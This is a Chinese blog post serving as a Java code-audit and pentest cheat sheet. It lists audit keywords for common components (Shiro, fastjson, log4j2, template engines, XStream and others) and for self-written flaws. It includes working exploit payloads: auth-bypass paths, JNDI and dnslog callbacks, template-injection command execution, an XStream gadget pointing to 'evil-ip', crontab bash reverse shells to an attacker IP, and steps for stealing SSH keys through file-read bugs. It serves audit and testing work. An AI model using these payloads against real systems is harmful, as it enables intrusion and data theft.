[{"content":"前言 Java安全是一个比较庞大的东西，单论Java代码审计所需要的知识点其实较为简单，Java安全研究会比较深入，其实可以这两者可以较为明显的区分开来，一个为了业务服务，一个为了深入挖掘。单论安全服务以及渗透测试的程度，业务层面的Java代码审计足以。如果是要深入研究的话，愚见认为，不同的岗位决定对知识的掌握深度，当前岗位如果有深入需求再考虑。以下文章内容仅从快速完成代码审计的视角出发，不涉及深入的漏洞研究。\n常见组件漏洞 1、Shiro shiro的漏洞主要是两个，一个是硬编码，一个是权限绕过：\n硬编码： 硬编码漏洞大家都知道问题出在rememberMe功能上，对于shiro而言，配置rememberMe的方法大致如下：\nsecurityManager.setRememberMeManager(rememberMeManager());//设置rememberMeManager() 关键词：setRememberMeManager 具体实现： public CookieRememberMeManager rememberMeManager() { CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager(); cookieRememberMeManager.setCookie(rememberMeCookie()); cookieRememberMeManager.setCipherKey(Base64.decode(\u0026#34;fCq+/xW488hMTCD+cmJ3aQ==\u0026#34;)); return cookieRememberMeManager; } 搜索密钥关键词：setCipherKey shiro还可以通过配置文件的方式进行配置，同样可以搜索关键词： org.apache.shiro.web.mgt.DefaultWebSecurityManager org.apache.shiro.web.mgt.CookieRememberMeManager 案例：\n权限绕过： CVE 描述 影响范围 payload CVE-2020-1957 权限绕过 Shiro \u0026lt; 1.5.2 /xxx/..;/admin/ CVE-2020-11989 CVE-2020-1957补丁绕过 Shiro \u0026lt; 1.5.3 /;/admin/page CVE-2020-13933 CVE-2020-11989补丁绕过 Shiro \u0026lt; 1.6.0 /admin/%3bpage CVE-2020-17523 权限绕过 Shiro \u0026lt; 1.7.1 /admin/%20 /admin/%2e shiro配置路径匿名访问的方法大概如下： 1、集中配置\n通过定义Shiro的ShiroFilterFactoryBean，可以设置具体的URL路径与对应的过滤器链： 关键词shiroFilterFactoryBean 2、注解\n@RequiresRoles、@RequiresPermissions 例如： @RequiresRoles(\u0026#34;admin\u0026#34;) public void someMethod() { // 方法内容 } 案例：\n2、fastjson 安全版本\u0026gt;1.2.83\nfastjson的触发点较为单一，关键词：JSON.parseObject、JSON.parse，只要相关参数用户可控即可。\n一些知识点：jdni注入，rmi要求JDK8版本低于8u121，ldap要求低于8u191，当然存在一些高版本jdk的利用姿势，不过代码审计的情况下可以尽量便利一些。\n由于fastjson采用的黑名单修复，很多类不一定能加载，以下dnslong仅限于证明参数用户可控，具体能否漏洞利用成功受限于具体的fastjson版本以及jdk版本。\n{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;http://8157cfb94b.ipv6.1433.eu.org\u0026#34;} {{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;http://8157cfb94b.ipv6.1433.eu.org\u0026#34;}:\u0026#34;x\u0026#34;} {\u0026#34;@type\u0026#34;:\u0026#34;java.net.InetAddress\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;} {\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet4Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;} {\u0026#34;@type\u0026#34;:\u0026#34;java.net.Inet6Address\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;} {{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}:\u0026#34;aaa\u0026#34;} {\u0026#34;@type\u0026#34;:\u0026#34;com.alibaba.fastjson.JSONObject\u0026#34;, {\u0026#34;@type\u0026#34;: \u0026#34;java.net.URL\u0026#34;, \u0026#34;val\u0026#34;:\u0026#34;http://dnslog\u0026#34;}}\u0026#34;\u0026#34;} Set[{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;http://dnslog\u0026#34;}] Set[{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;http://dnslog\u0026#34;} {\u0026#34;@type\u0026#34;:\u0026#34;java.net.InetSocketAddress\u0026#34;{\u0026#34;address\u0026#34;:,\u0026#34;val\u0026#34;:\u0026#34;dnslog\u0026#34;}} {{\u0026#34;@type\u0026#34;:\u0026#34;java.net.URL\u0026#34;,\u0026#34;val\u0026#34;:\u0026#34;http://dnslog\u0026#34;}:0 案例：\n这个参数非常清晰： 3、log4j2 Apache Log4j 2.x \u0026lt;= 2.15.0-rc1\nlog4j2的触发点审计需要知道一些前提知识点：\nlog4j的日志记录具有等级划分： ALL \u0026lt; TRACE \u0026lt; DEBUG \u0026lt; INFO \u0026lt; WARN \u0026lt; ERROR \u0026lt; FATAL \u0026lt; OFF 默认情况下只会记录大于WARN等级的日志，也就是说默认情况下，我们的审计关键词为logger.error和logger.fatal 但是也有修改等级的方法，审计的时候需要注意： 1、通过编程方式设置 import org.apache.logging.log4j.Level logger.setLevel(Level.DEBUG); // 设置日志等级为 DEBUG 2、XML 配置文件 \u0026lt;Loggers\u0026gt; \u0026lt;Root level=\u0026#34;debug\u0026#34;\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;Console\u0026#34;/\u0026gt; \u0026lt;/Root\u0026gt; \u0026lt;/Loggers\u0026gt; 3、 JSON 配置文件 \u0026#34;Loggers\u0026#34;: { \u0026#34;Root\u0026#34;: { \u0026#34;level\u0026#34;: \u0026#34;debug\u0026#34;, 4、 YAML 配置文件 Loggers: Root: level: debug 根据配置文件，可以确定审计的关键词为：logger.TRACE \u0026lt; DEBUG \u0026lt; INFO \u0026lt; WARN \u0026lt; ERROR \u0026lt; FATAL payload：\n${jndi:ldap://${env:OS}.61169aeb6f.ipv6.1433.eu.org} 案例：\n所有的日志都将生效：\n寻找可控点：\n这里是一个获取上传文件名的地方，参数可控：\n4、SpEL SpEL表达式注入，这个漏洞其实在网站开发者中的自编码中并不常见，更多是在spring家族的一些组件里面，这个简单来说就是将用户的输入带入SpEL表达式中执行了：\n单独代码审计关键词：\n//关键类 org.springframework.expression.Expression org.springframework.expression.ExpressionParser org.springframework.expression.spel.standard.SpelExpressionParser //调用特征 ExpressionParser parser = new SpelExpressionParser(); Expression expression = parser.parseExpression(str); expression.getValue() expression.setValue() 黑盒一般使用一些数字${3333-1} 一些著名的SpEL注入组件：\nCVE-2016-4977 黑盒有概率遇到 Spring Security OAuth 2.3到2.3.2 Spring Security OAuth 2.2到2.2.1 Spring Security OAuth 2.1到2.1.1 Spring Security OAuth 2.0到2.0.14 CVE-2017-4971 Pivotal Spring_Web_Flow 2.4.0到2.4.4 CVE-2017-8046 Pivotal_Software Spring_Data_Rest \u0026lt; 2.6.9 VMware Spring_Boot 2.0.0 VMware Spring_Boot \u0026lt; 1.5.9 Pivotal_Software Spring_Data_Rest 3.0.0 CVE-2018-1270 Spring Framework 5.0 to 5.0.4. Spring Framework 4.3 to 4.3.14 CVE-2018-1273 Spring Data Commons 1.13至1.13.10 Spring Data REST 2.6至2.6.10 Spring Data Commons 2.0至2.0.5 Spring Data REST 3.0至3.0.5 CVE-2022-22947 黑盒有大概率遇到 Spring Cloud Gateway 3.1.0至3.1.1和3.0.0至3.0.6 CVE-2022-22963 黑盒有大概率遇到 org.springframework.cloud:spring-cloud-function-context （影响版本：3.0.0.RELEASE~3.2.2） CVE-2022-22965 这个不是SpEL表达式注入，但是影响范围比较大，作为审计来说有必要进行查看，黑盒有概率遇到 Spring Framework 5.3.X \u0026lt; 5.3.18 Spring Framework 5.2.X \u0026lt; 5.2.20 及其衍生产品 JDK ≥ 9 上诉漏洞部分在黑盒中并不好使，容易被发现的以进行了备注，利用详情可查看另外一个文章，不容易被黑盒发现的作为审计来说也应该注意规避风险。\n5、模板注入 JAVA中比较严重的SSTI模板注入主要发生在三个组件上：Freemarker、Velocity、Thymeleaf，因为它们允许直接调用底层 Java 方法：\nFreemarker： Freemarker的漏洞在于用户可以修改模板，修改模板的方法目前有三个：一是通过stringLoader.putTemplate方法来把模板加载到内存中，二个是通过实例化Template类，三是通过其他方法直接修改对应的模板文件，在实战中多见于参数直接传递，或者直接修改模板文件。 审计正则表达式： html可换成ftl return\\(.*?\\.html return\\s*\u0026#34;.*?\\.html\u0026#34; render\\(.*?\\.html 当一个Controller的方法没有返回值（即返回类型为`void`），并且使用了`@GetMapping`或`@PostMapping`等注解来处理HTTP请求时，Spring MVC会默认将请求的URL作为视图名称，并使用配置的模板引擎（如Thymeleaf）去渲染对应的模板。 审计正则表达式： @GetMapping\\(.*?\\)\\s*public\\s+void/gm payload: new函数： \u0026lt;#assign value=\u0026#34;freemarker.template.utility.Execute\u0026#34;?new()\u0026gt;${value(\u0026#34;calc.exe\u0026#34;)} \u0026lt;#assign value=\u0026#34;freemarker.template.utility.ObjectConstructor\u0026#34;?new()\u0026gt;${value(\u0026#34;java.lang.ProcessBuilder\u0026#34;,\u0026#34;calc.exe\u0026#34;).start()} \u0026lt;#assign value=\u0026#34;freemarker.template.utility.JythonRuntime\u0026#34;?new()\u0026gt;\u0026lt;@value\u0026gt;import os;os.system(\u0026#34;calc.exe\u0026#34;) api函数： #assign classLoader=object?api.class.protectionDomain.classLoader\u0026gt; \u0026lt;#assign clazz=classLoader.loadClass(\u0026#34;ClassExposingGSON\u0026#34;)\u0026gt; \u0026lt;#assign field=clazz?api.getField(\u0026#34;GSON\u0026#34;)\u0026gt; \u0026lt;#assign gson=field?api.get(null)\u0026gt; \u0026lt;#assign ex=gson?api.fromJson(\u0026#34;{}\u0026#34;, classLoader.loadClass(\u0026#34;freemarker.template.utility.Execute\u0026#34;))\u0026gt; ${ex(\u0026#34;Calc\u0026#34;\u0026#34;)} 其中api的方法在2.3.22版本之后默认无法使用，new方法在2.3.30版本后也被做了一些限制，无法直接执行命令，但是仍然需要注意，所以建议至少版本在2.3.30版本后，同时无危险使用方法。 案例参考： https://github.com/pawelkaliniakit/springboot-freemarker-ssti/tree/master https://github.com/nth347/Java-SSTI-demo\nThymeleaf 比较常规的漏洞版本是：Thymeleaf 3.0.0 至 3.0.11，但是后续的漏洞版本修复存在一些绕过问题，建议至少大于3.0.15。 和上一个模板注入的情况类似，我认为最常见的情况还是return或者render返回对应的前端文件。 审计正则表达式： html可换成ftl return\\(.*?\\.html return\\s*\u0026#34;.*?\\.html\u0026#34; render\\(.*?\\.html 当一个Controller的方法没有返回值（即返回类型为`void`），并且使用了`@GetMapping`或`@PostMapping`等注解来处理HTTP请求时，Spring MVC会默认将请求的URL作为视图名称，并使用配置的模板引擎（如Thymeleaf）去渲染对应的模板。 审计正则表达式： @GetMapping\\(.*?\\)\\s*public\\s+void/gm payload: __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%27calc.exe%27).getInputStream()).next()%7d__::.x Velocity 安全版本：Velocity大于2.2 重点关注： org.apache.velocity.app.Velocity 的 evaluate 和 mergeTemplate 方法 org.apache.velocity.app.VelocityEngine 的 evaluate 和 mergeTemplate 方法 org.apache.velocity.runtime.RuntimeServices 的 evaluate 和 parse 方法 org.apache.velocity.runtime.RuntimeSingleton 的 parse 方法 org.apache.velocity.runtime.resource.util.StringResourceRepository 的 putStringResource 方法 payload: #set ($exec = \u0026#34;kxlzx\u0026#34;)$exec.class.forName(\u0026#34;java.lang.Runtime\u0026#34;).getRuntime().exec(\u0026#34;calc\u0026#34;) %23set($e=\u0026#34;e\u0026#34;);$e.getClass().forName(\u0026#34;java.lang.Runtime\u0026#34;).getMethod(\u0026#34;getRuntime\u0026#34;,null).invoke(null,null).exec(\u0026#34;calc\u0026#34;) 6、其他 XStream \u0026lt;= 1.4.16 这个组件是用来解析xml文件的，可以理解为将xml文件反序列化为对象，和fastjson很像，在反序列化时会调用对象的readObject方法，找到合适的链子即可RCE，目前使用的较多的是JDNI的那条，审计关键词： XStream.fromXML() poc，修改evil-ip：\njava -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 \u0026#34;whoami\u0026#34; //无回显哦，直接打，修改payload直接看看监听也可 \u0026lt;java.util.PriorityQueue serialization=\u0026#39;custom\u0026#39;\u0026gt; \u0026lt;unserializable-parents/\u0026gt; \u0026lt;java.util.PriorityQueue\u0026gt; \u0026lt;default\u0026gt; \u0026lt;size\u0026gt;2\u0026lt;/size\u0026gt; \u0026lt;/default\u0026gt; \u0026lt;int\u0026gt;3\u0026lt;/int\u0026gt; \u0026lt;javax.naming.ldap.Rdn_-RdnEntry\u0026gt; \u0026lt;type\u0026gt;12345\u0026lt;/type\u0026gt; \u0026lt;value class=\u0026#39;com.sun.org.apache.xpath.internal.objects.XString\u0026#39;\u0026gt; \u0026lt;m__obj class=\u0026#39;string\u0026#39;\u0026gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content\u0026lt;/m__obj\u0026gt; \u0026lt;/value\u0026gt; \u0026lt;/javax.naming.ldap.Rdn_-RdnEntry\u0026gt; \u0026lt;javax.naming.ldap.Rdn_-RdnEntry\u0026gt; \u0026lt;type\u0026gt;12345\u0026lt;/type\u0026gt; \u0026lt;value class=\u0026#39;com.sun.xml.internal.ws.api.message.Packet\u0026#39; serialization=\u0026#39;custom\u0026#39;\u0026gt; \u0026lt;message class=\u0026#39;com.sun.xml.internal.ws.message.saaj.SAAJMessage\u0026#39;\u0026gt; \u0026lt;parsedMessage\u0026gt;true\u0026lt;/parsedMessage\u0026gt; \u0026lt;soapVersion\u0026gt;SOAP_11\u0026lt;/soapVersion\u0026gt; \u0026lt;bodyParts/\u0026gt; \u0026lt;sm class=\u0026#39;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl\u0026#39;\u0026gt; \u0026lt;attachmentsInitialized\u0026gt;false\u0026lt;/attachmentsInitialized\u0026gt; \u0026lt;nullIter class=\u0026#39;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator\u0026#39;\u0026gt; \u0026lt;aliases class=\u0026#39;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl\u0026#39;\u0026gt; \u0026lt;candidates class=\u0026#39;com.sun.jndi.rmi.registry.BindingEnumeration\u0026#39;\u0026gt; \u0026lt;names\u0026gt; \u0026lt;string\u0026gt;aa\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;aa\u0026lt;/string\u0026gt; \u0026lt;/names\u0026gt; \u0026lt;ctx\u0026gt; \u0026lt;environment/\u0026gt; \u0026lt;registry class=\u0026#39;sun.rmi.registry.RegistryImpl_Stub\u0026#39; serialization=\u0026#39;custom\u0026#39;\u0026gt; \u0026lt;java.rmi.server.RemoteObject\u0026gt; \u0026lt;string\u0026gt;UnicastRef\u0026lt;/string\u0026gt; \u0026lt;string\u0026gt;evil-ip\u0026lt;/string\u0026gt; \u0026lt;int\u0026gt;1099\u0026lt;/int\u0026gt; \u0026lt;long\u0026gt;0\u0026lt;/long\u0026gt; \u0026lt;int\u0026gt;0\u0026lt;/int\u0026gt; \u0026lt;long\u0026gt;0\u0026lt;/long\u0026gt; \u0026lt;short\u0026gt;0\u0026lt;/short\u0026gt; \u0026lt;boolean\u0026gt;false\u0026lt;/boolean\u0026gt; \u0026lt;/java.rmi.server.RemoteObject\u0026gt; \u0026lt;/registry\u0026gt; \u0026lt;host\u0026gt;evil-ip\u0026lt;/host\u0026gt; \u0026lt;port\u0026gt;1099\u0026lt;/port\u0026gt; \u0026lt;/ctx\u0026gt; \u0026lt;/candidates\u0026gt; \u0026lt;/aliases\u0026gt; \u0026lt;/nullIter\u0026gt; \u0026lt;/sm\u0026gt; \u0026lt;/message\u0026gt; \u0026lt;/value\u0026gt; \u0026lt;/javax.naming.ldap.Rdn_-RdnEntry\u0026gt; \u0026lt;/java.util.PriorityQueue\u0026gt; \u0026lt;/java.util.PriorityQueue\u0026gt; Dubbo Dubbo CVE-2019-17564 该漏洞最后触发点在readObject() 2.7.0 \u0026lt;= Apache Dubbo \u0026lt;= 2.7.4 2.6.0 \u0026lt;= Apache Dubbo \u0026lt;= 2.6.7 Apache Dubbo = 2.5.x \u0026lt;properties\u0026gt; \u0026lt;dubbo.version\u0026gt;2.7.5\u0026lt;/dubbo.version\u0026gt; \u0026lt;/properties\u0026gt; \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.dubbo\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;dubbo\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${dubbo.version}\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.dubbo\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;dubbo-dependencies-zookeeper\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;${dubbo.version}\u0026lt;/version\u0026gt; \u0026lt;type\u0026gt;pom\u0026lt;/type\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; druid 这个组件在黑盒中十分常见，存在未授权的情况大概如下： druid的配置文件一般是Spring Boot 的 application.yml 或 application.properties stat-view-servlet配置关键词： enabled：是否启用 Druid 监控页面。 login-username：监控页面登录账号。 login-password：监控页面登录密码。 reset-enable：是否允许重置统计数据。 一般来说只要是enabled: true就是有相关页面的，但是是否存在未授权还要看整个系统的访问控制以及是否配置了一些访问限制 案例：\n这里是配置了相关路径的：\n但是直接访问不行，会被shiro的权限控制给拦截，在shiro中添加匿名访问路径：\n就会有匿名访问了： Spring boot Actuator Spring Boot Actuator 是 Spring Boot 提供的一个监控和管理工具，它提供了一系列的Endpoints，允许开发者访问应用程序的运行时信息，如健康检查、环境属性、度量指标等，这是个未授权访问，在黑盒测试中也是常客，多次headump敏感信息泄露拿下站点：\n相关组件： \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-actuator\u0026lt;/artifactId\u0026gt; 配置文件一般是Spring Boot 的 application.yml 或 application.properties 以下是一些常用的配置项： management.endpoints.web.exposure.include：指定哪些端点应该被暴露出来。默认情况下，只有 /health 和 /info 这两个端点可用。如果想启用所有端点，可以设置为 * management.endpoints.web.exposure.exclude：指定哪些端点不应该被暴露出来 management.endpoints.web.base-path：指定所有端点的基础路径，默认为 /actuator management.endpoints.web.path-mapping：指定端点的路径映射 management.endpoints.web.cors.allowed-origins：指定哪些源站点可以访问端点 management.endpoint.health.show-details：更改健康端点的显示详细信息，可以设置为 always、when_authorized 或 never 案例：\nSwagger 这个也是黑盒常客，和druid一样的，开启即会有页面，但是是否可访问还要看权限控制：\n组件： \u0026lt;groupId\u0026gt;io.springfox\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;springfox-swagger2\u0026lt;/artifactId\u0026gt; \u0026lt;groupId\u0026gt;io.springfox\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;springfox-swagger-ui\u0026lt;/artifactId\u0026gt; 配置一般是一个单独的java类： 关键词： @EnableSwagger2 import springfox.documentation.swagger2 案例：\n添加匿名权限：\nApache ActiveMQ 漏扫常客：\n漏洞编号 漏洞类型 版本 CVE-2024-32114 未授权 6.0.0 \u0026lt;= Apache ActiveMQ \u0026lt; 6.1.2 CVE-2023-46604 RCE Apache AchtiveMQ \u0026lt;= 5.18.2 CVE-2022-41678 RCE Apache ActiveMQ \u0026lt; 5.16.6 5.17.0\u0026lt; Apache ActiveMQ \u0026lt; 5.17.4 CVE-2017-15709 信息泄漏 Apache ActiveMQ \u0026lt;= 5.15.2 CVE-2016-3088 任意文件写入 Apache ActiveMQ \u0026lt; 5.14.0 CVE-2015-5254 反序列化 Apache ActiveMQ \u0026lt; 5.13.0 依赖： \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.springframework.boot\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;spring-boot-starter-activemq\u0026lt;/artifactId\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.activemq\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;activemq-pool\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;5.12.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在application.properties或application.yml配置： spring.activemq.broker-url=tcp://localhost:61616 spring.activemq.user=admin spring.activemq.password=admin Zookeeper ZooKeeper是一个开源的分布式协调服务，它主要用于分布式系统的协调、配置管理、命名、提供分布式同步以及组服务等\n安全版本：Apache ZooKeeper \u0026gt;= 3.9.3\n配置： \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.zookeeper\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;zookeeper\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.7.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 在application.properties或application.yml配置： zookeeper.connect-string=localhost:2181 connect-string: localhost:2181 不安全的反射 这个漏洞在实战中并不多见，但是有少量的案例，大多和RCE有关：\n关键类： java.lang.reflect.Method.invoke() java.lang.ClassLoader.loadClass() java.net.URLClassLoader.newInstance() org.codehaus.groovy.runtime.InvokerHelper.invokeMethod() 这个漏洞具体得看相关代码和触发条件，大多还位于能直接调用类的功能点，寻找可用类是个比较麻烦的地方，不过从甲方视角来看，仍然是个需要修复的地方，建议做好限制。 自编码漏洞 1、SQL注入 Sql注入大部分静态代码审计都可以做到扫出，重点在于参数是否确实可控，以及相关的插入位置是否好利用，例如之前遇到过一些子查询，确实会将用户语句带入其中，但是用户十分难以控制，这种在甲方视角勉强算一个需要处理的点，但是在红队视角实在是难以算作可以利用。\nmybatis：\n1. Like 模糊查询： Select * from student where name like \u0026#39;%${name}%\u0026#39; 2. IN 查询： Select * from news where id in (${id}) 3. order by、group by 查询： select * from studentwhere id order by ${id} JDBC：\nString sql = \u0026#34;select * from users where id = \u0026#39;\u0026#34;+id+\u0026#34;\u0026#39; \u0026#34;; 2、XSS 在java中XSS漏洞不是一个，个别点位的问题，它应该是一个整体项目的问题，XSS漏洞的逻辑是从前端获取参数，然后重新渲染到前端的过程，这中间可以从后端拦截处理，前端技术也可避免XSS，但是很多甲方视角可能不太认可前端处理的情况。\n从我的观点来看，如果一个系统没有全局过滤Filter来处理XSS，那么有很大可能是存在XSS的，关键词：XSS、XSSFilter，或者全局查找filter。\n但是参数的追踪是个比较麻烦的事情，具体是否返回给前端参数了，需要具体情况具体分析，同样的，如果给了前端，前端是否正确解析也是一个问题，比如使用了VUE、React、Angular、以及ESAPI转义后的字符。\n前端参数的获取方式：\n目前主流的获取前端参数的方式有三种： 1、Servlet request.getParameter(\u0026#34;xx\u0026#34;) 2、Struts2框架 public class MyAction extends ActionSupport { private String username; private String password; 3、SpringMVC @RequestParam @param 最后，无论是反射型的XSS还存储型的XSS，其实我认为最好还是借助工具和黑盒测验比较好，纯白盒不是很好操作，虽然网上很多人说fortify对于XSS审计还行，但是实际上还是很难完全审好，如果硬要手动审计，我建议从前端触发点反推到Controller：\n关键词：\n\u0026lt;%= ${ \u0026lt;c:out \u0026lt;c:if \u0026lt;c:forEach ModelAndView ModelMap Model request.getParameter request.setAttribute resopnse.getWriter() 案例：\n结合黑盒测试，把用户名修改为xss payload然后刷新发现弹窗：\n然后追踪到前端，此处是一个获取展示用户名的功能，可以看到关键词：${requestScope.admin.admin_name}\n向上查找：\n继续向上：\n可以看到参数返回了：\n进入数据库看看，至于怎么写入的，会跟踪controller到dao层的就能看懂：\n3、文件上传 文件上传在较近年的springboot项目中可能遇到JSP文件不解析的情况，因为springboot内置的tomcat服务器默认不支持tomcat-embed-jasper，但是不代表这个漏洞不重要，就算无法直接写webshell，但是如果java程序是以高权限启动的，配合目录穿越，可能导致写入密钥、计划任务、passwd、如果能触发jar包的话，方法就更多了。\n关键词：\nCommonsMultipartFile new FileOutputStream new File(realPath); ServletFileUpload lastIndexOf(\u0026#34;.\u0026#34;) indexOf(\u0026#34;.\u0026#34;) MultipartFile .write .println .writeUTF .writeBytes .writeObject tomcat-embed-jasper组件： \u0026lt;groupId\u0026gt;org.apache.tomcat.embed\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-embed-jasper\u0026lt;/artifactId\u0026gt; 案例：\n基本没有什么过滤：\ncentos: echo \u0026#39;*/1 * * * * bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.25.128/11111 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; /var/spool/cron/root echo \u0026#39;*/1 * * * * root bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.25.128/33333 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt;\u0026gt; /etc/crontab ubuntu: echo \u0026#39;*/1 * * * * bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.25.128/11111 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt; /var/spool/cron/crontabs/root echo \u0026#39;*/1 * * * * root bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.25.128/33333 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/crontab 其实这里还是有些问题的，ubuntu对于计划任务的文件权限有些要求，测试600可以正常反弹，centos应该就可以直接使用这个方式了：\n4、任意文件下载 这个漏洞在打多数的系统中都是用来获取敏感信息的，如果想要以此获得更多东西，可以尝试读取配置文件、/home/username/.ssh/id_rsa(id_ecdsa)、或者jar包：\n【Step1】定位启动的时候jar包的pid 通过任意文件读取/proc/sched_debug，获取服务器中的进程信息。通过关键字java定位SpringBoot对应的进程，获取进程号pid。实战取决于目标系统的情况，实在不行可以爆破。 【Step2】获取jar包绝对路径 通过/proc/[PID]/cmdline和/proc/[PID]/environ,其中的PWD存在绝对路径，一般情况下通过这种方式可以拿到SpringBoot对应的jar包的绝对路径。其中cmdline可以获取进程对应的包名，environ可以获取对应的绝对路径，组合之后可以得到jar包对应绝对路径。 关键词：\nfileName filePath getFile getWriter InputStream File OutputStreaam BufferedInputStream FileInputStream 案例：\n这里有个前置路径，全局设置的download下载目录，不过不重要，../可以目录穿越：\n任意文件读取：\n获取进程信息：\n名字：\n下载jar包，war包其实同理：\n5、SSRF\u0026amp;CSRF SSRF其实在java中的危害比较有限了，因为JDK7高版本，以及JDK8以上都不支持一些高危协议比如Gopher和DICT了，只需要在代码中做好限制范围和协议即可。\nHttpURLConnection.getInputStream URLConnection.getInputStream Request.Get.execute Request.Post.execute URL.openStream ImageIO.read OkHttpClient.newCall.execute HttpClients.execute HttpClient.execute BasicHttpEntityEnclosingRequest() DefaultBHttpClientConnection() BasicHttpRequest() CSRF的话主要看相关的一些功能点是否有做好限制，比如Token或者Referer或者验证码等其他手段，本身的危害不大，比如一些功能：更改个人信息、添加/修改资料、关注/取关用户、发布主题或信息、与交易相关的操作，审计的话，配合黑盒全局搜索Token、Referer、CSRF等关键词。\n6、URL重定向 这个漏洞主要用来钓鱼，红队实战用到不多，但是绝对不是没有用处，常见于登录、注册、下单、付款、查看个人信息。\n关键词：\nredirect url redirectUrl callback return_url toUrl ReturnUrl fromUrl redUrl request redirect_to redirect_url jump jump_to target to goto link linkto domain oauth_callback http://localhost/vulnapi/redirect/vul?url=https://www.baidu.com 7、逻辑漏洞 从黑盒测试的经验来看，逻辑漏洞在java中的产出概率比其他漏洞其实高不少，因为种种框架的出现，帮助开发者规避了很多的top10漏洞，但是业务逻辑很大程度取决于开发者，而开发者不是每个都具有安全意识的。\n其实我认为从发掘安全问题的角度出发，逻辑漏洞应该是黑盒更方便进行检测，常见的一些逻辑漏洞：\n数据可遍历 越权 API未授权 用户名、密码爆破【登录认证问题】 支付漏洞 验证码问题【验证码不失效、一码多用、可被识别、可被猜测、可被绕过】 密码重置 权限问题 上面列出的漏洞中其中一半可以认为是权限问题，权限设计的经典五张表，可以在持久层查看代码是否有考虑到：\n用户表（User Table）：存储系统中所有合法用户的详细信息，如用户ID、用户名、密码等。 角色表（Role Table）：存储系统中的角色信息，包括角色ID、角色名称以及角色描述等。 权限表（Permission Table）：也称为资源表，存储系统中所有需要控制访问权限的资源或权限信息，如权限ID、权限名称、权限描述等。 用户-角色关联表（User-Role Association Table）：描述用户和角色之间的关系，通常包含用户ID和角色ID。 角色-权限关联表（Role-Permission Association Table）：描述角色和权限之间的关系，通常包含角色ID和权限ID。 java常见的权限验证方法，shiro、Spring Security或者手动编写的filter，代码审计可以快速确定，然后是手动filter存在被绕过的可能性，常见的绕过payload为:\n../ ; /admin/main.do/ //system/UserInfoSearch.do 支付问题 找到对应的功能点，详细捋清逻辑：\n1、支付、取款、转账任意金额的修改，未对正负数、原金额足额比较； 2、来自前端的金额直接执行支付操作，未对前端折扣金额等于后端的金额比对； 3、如果未对同一客户端IP、同一用户、同一时间段内重复下单的频率进行先限制和提醒，造成无限刷单； 密码问题 常见功能如找回密码、重置密码：\n1、未同时校验原密码和验证码以及新密码 2、水平、垂直越权修改密码 3、短信验证码显示在获取验证码请求的回显中 4、用户名、手机号码、短信验证码三者没有进行匹配性验证：只验证了手机号码、短信验证码是否匹配，但最终重置密码是根据用户名来重置的，攻击者可以绕过短信验证码限制来重置用户密码 5、弱随机性或可预测的令牌生成 未完待续\u0026hellip;\u0026hellip;\n","permalink":"https://yangzhuzai.github.io/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/","summary":"\u003ch1 